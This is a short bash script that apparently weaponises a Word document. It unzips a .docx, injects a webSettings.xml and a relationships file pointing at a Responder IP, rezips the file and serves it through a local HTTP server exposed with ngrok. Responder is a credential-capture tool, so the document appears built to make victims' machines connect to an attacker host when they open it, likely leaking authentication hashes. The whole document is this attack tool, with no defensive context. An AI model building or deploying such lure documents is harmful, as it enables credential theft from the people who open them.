#!/bin/bash

responder_ip=""
filename="$1"
base=$(echo $filename | cut -d "." -f 1)
temp="$base.tmp"

mkdir $temp
unzip $filename -d "$temp/"

cp resources/webSettings.xml $temp/word/webSettings.xml
cat resources/webSettings.xml.rels | sed "s/CHANGEME/$responder_ip/g" > $temp/word/_rels/webSettings.xml.rels

cd "$temp/"
zip -r "$base-modified.docx" *
cd ..
mkdir -p out/
mv $temp/$base-modified.docx out/
rm -rf $temp
cd out/
python -m http.server 8282 &
ngrok http 8282
